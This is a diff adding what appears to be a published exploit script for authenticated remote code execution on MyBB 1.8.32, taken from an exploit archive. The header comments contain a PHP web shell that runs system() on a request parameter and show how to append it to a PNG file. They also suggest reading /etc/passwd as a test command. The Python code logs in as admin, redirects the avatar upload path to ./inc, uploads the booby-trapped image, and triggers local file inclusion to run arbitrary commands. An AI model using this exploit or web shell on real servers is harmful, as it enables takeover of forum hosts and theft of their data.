@@ -1,0 +1,213 @@
+id: 38443
+date: 04/03/2023
+title: MyBB 1.8.32 - Remote Code Execution (Authenticated) Exploit
+author: lUc1f3r11
+cves: 
+
+# Exploit Title: MyBB 1.8.32 - Chained LFI Remote Code Execution (RCE) (Authenticated)
+# Exploit Author: lUc1f3r11 (https://github.com/FDlucifer)
+# Vendor Homepage: https://mybb.com/
+# Software Link: https://github.com/mybb/mybb/releases/tag/mybb_1832
+# Version: MyBB 1.8.32
+# Tested on: Linux
+# CVE : N/A
+# Detailed Analysis : https://fdlucifer.github.io/2023/01/17/mybb1-8-32-LFI-RCE/
+
+# (1). An RCE can be obtained on MyBB's Admin CP in Configuration -> Profile Options -> Avatar Upload Path. to change Avatar Upload Path to /inc to bypass blacklist upload dir.
+# (2). after doing that, then we are able to chain in "admin avatar upload" page: http://www.mybb1832.cn/admin/index.php?module=user-users&action=edit&uid=1#tab_avatar, and LFI in "Edit Language Variables" page: http://www.mybb1832.cn/admin/index.php?module=config-languages&action=edit&lang=english.
+# (3). This chained bugs can lead to Authenticated RCE.
+# (note). The user must have rights to add or update settings and update Avatar. This is tested on MyBB 1.8.32.
+#
+#
+# Exp Usage:
+# 1.first choose a png file that size less than 1kb
+# 2.then merge the png file with a php simple backdoor file using the following commands
+# mac@xxx-2 php-backdoor % cat simple-backdoor.php 
+# <?php
+# if(isset($_REQUEST['cmd'])){
+#         echo "<getshell success>";
+#         $cmd = ($_REQUEST['cmd']);
+#         system($cmd);
+#         echo "<getshell success>";
+#         phpinfo();
+# }
+# ?>
+# mac@xxx-2 php-backdoor % ls     
+# simple-backdoor.php     test.png
+# mac@xxx-2 php-backdoor % cat simple-backdoor.php >> test.png 
+# mac@xxx-2 php-backdoor % file test.png 
+# test.png: PNG image data, 16 x 16, 8-bit/color RGBA, non-interlaced
+# 3.finnally run the following commands to run the exp script to get RCE output! enjoy the shell...
+# python3 exp.py --host http://www.xxx.cn --username admin --password xxx --email xxx@qq.com --file avatar_1.png --cmd "cat /etc/passwd"
+
+
+import requests
+import argparse
+from bs4 import BeautifulSoup
+from requests_toolbelt import MultipartEncoder
+import re
+
+
+r_clients = requests.Session()
+
+
+def exploit(username, password, email, host, file, cmd):
+    # Adding ./inc upload path settings to bypass avatar upload path blacklists
+
+    data = {
+        "username" : username,
+        "password" : password,
+        "do" : "login"
+    }
+
+    login_txt = r_clients.post(host + "/admin/index.php", data=data).text
+
+    if "The username and password combination you entered is invalid" in login_txt:
+        print("[-] Login failure. Incorrect credentials supplied")
+        exit(0)
+
+    print("[+] Login successful!")
+
+    if "Access Denied" in login_txt:
+        print("[-] Supplied user doesn't have the rights to add a setting")
+        exit(0)
+
+    print("[*] Adding ./inc upload path settings...")
+
+    soup = BeautifulSoup(login_txt, "lxml")
+    my_post_key = soup.find_all("input", {"name" : "my_post_key"})[0]['value']
+    print("[+] my_post_key: ", my_post_key)
+    print("[+] cookies: ", r_clients.cookies.get_dict())
+    cookies = r_clients.cookies.get_dict()
+
+    data = {
+        "my_post_key" : my_post_key,
+        "gid" : 10,
+        "upsetting[sigmycode]" : 1,
+        "upsetting[sigcountmycode]" : 1,
+        "upsetting[sigsmilies]" : 1,
+        "upsetting[sightml]" : 0,
+        "upsetting[sigimgcode]" : 1,
+        "upsetting[maxsigimages]" : 2,
+        "upsetting[siglength]" : 255,
+        "upsetting[hidesignatures]" : "",
+        "upsetting[hidewebsite]" : "",
+        "upsetting[useravatar]" : "./inc",
+        "upsetting[useravatardims]" : "100x100",
+        "upsetting[useravatarrating]" : 0,
+        "upsetting[maxavatardims]" : "100x100",
+        "upsetting[avatarsize]" : 25,
+        "upsetting[avatarresizing]" : "auto",
+        "upsetting[avataruploadpath]" : "./inc",
+        "upsetting[allowremoteavatars]" : 1,
+        "upsetting[customtitlemaxlength]" : 40,
+        "upsetting[allowaway]" : 1,
+        "upsetting[allowbuddyonly]" : 0
+    }
+
+    modify_settings_txt = r_clients.post(host + "/admin/index.php?module=config-settings&action=change",data=data,allow_redirects=False, cookies=cookies)
+
+    if modify_settings_txt.status_code != 302:
+        soup = BeautifulSoup(modify_settings_txt.text, "lxml")
+        error_txt = soup.find_all("div", {"class" : "error"})[0].text
+        print("[-] modify upload path failed. Reason: '{}'".format(error_txt))
+        exit(0)
+
+    print("[+] ./inc upload path settings added!")
+
+    # upload malicious avatar in admin panel
+    with open("test.png", "rb") as f:
+        image_binary = f.read()
+    print("[+] read image successful! ")
+
+    print("[+] image contents: ", image_binary)
+
+    filename = "test.png"
+
+    data1 = {
+        'my_post_key': my_post_key,
+        'username': username,
+        'email': email,
+        'avatar_upload': (filename, open(filename, 'rb'), 'image/png')
+    }
+
+    m = MultipartEncoder(data1)
+
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/109.0",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+        "Accept-Encoding": "gzip, deflate",
+        "Content-Type": m.content_type,
+        "Origin": "null",
+        "Connection": "close",
+        "Upgrade-Insecure-Requests": "1"
+    }
+
+    upload_url = host + "/admin/index.php?module=user-users&action=edit&uid=1"
+
+    upload = r_clients.post(upload_url, data=m, allow_redirects=False, headers=headers, cookies=cookies)
+
+    if upload.status_code != 302:
+        soup = BeautifulSoup(upload.text, "lxml")
+        error_txt = soup.find_all("div", {"class" : "error"})[0].text
+        print("[-] upload avatar didn't work. Reason: '{}'".format(error_txt))
+        exit(0)
+
+    print("[+] upload malicious avatar png success!")
+
+    # commands exec and get the output, we are done finally :)
+    data2 = {
+        'my_post_key': my_post_key,
+        'file': file,
+        'lang': "english",
+        'editwith': "..",
+        'inadmin': 0
+    }
+
+    exec_url = host + "/admin/index.php?module=config-languages&action=edit&cmd=" + cmd
+
+    commands_exec = r_clients.post(exec_url, data=data2, cookies=cookies)
+
+    if commands_exec.status_code != 200:
+        soup = BeautifulSoup(commands_exec.text, "lxml")
+        error_txt = soup.find_all("div", {"class" : "error"})[0].text
+        print("[-] command exec didn't work. Reason: '{}'".format(error_txt))
+        exit(0)
+
+    cmd_output = re.findall(r'<getshell success>(.*?)<getshell success>', commands_exec.text, re.S)
+
+    print("[+] exec status: ", commands_exec.status_code)
+    print("[+] command exec success:\n\n", cmd_output[0].replace("\n", "\n"))
+
+
+parser = argparse.ArgumentParser()
+parser.add_argument('--username', required=True, help="MyBB Admin CP username")
+parser.add_argument('--password', required=True, help="MyBB Admin CP password")
+parser.add_argument('--email', required=True, help="MyBB Admin CP admin's email (easy to find in admin users panal)")
+parser.add_argument('--file', required=True, help="the image file name in the server that we uploaded before. (easy to find in admin users panal)")
+parser.add_argument('--host', required=True, help="e.g. http://target.website.local, http://10.10.10.10, http://192.168.23.101:8000")
+parser.add_argument('--cmd', required=False, help="Command to run")
+args = parser.parse_args()
+
+username = args.username
+password = args.password
+email = args.email
+file = args.file
+host = args.host
+cmd = "id" if args.cmd == None else args.cmd
+
+print("""_______________________________________\n
+/ MyBB 1.8.32 - Chained LFI Remote Code \ \n
+\ Execution (RCE) (Authenticated)       / \n
+ --------------------------------------- \n
+        \   ^__^ \n
+         \  (oo)\_______ \n
+            (__)\       )\/\ \n
+                ||----w | \n
+                ||     || \n
+Author: lUc1f3r11
+Github: https://github.com/FDlucifer""")
+exploit(username, password, email, host, file, cmd)
+
+#  0day.today [2023-04-19]  #
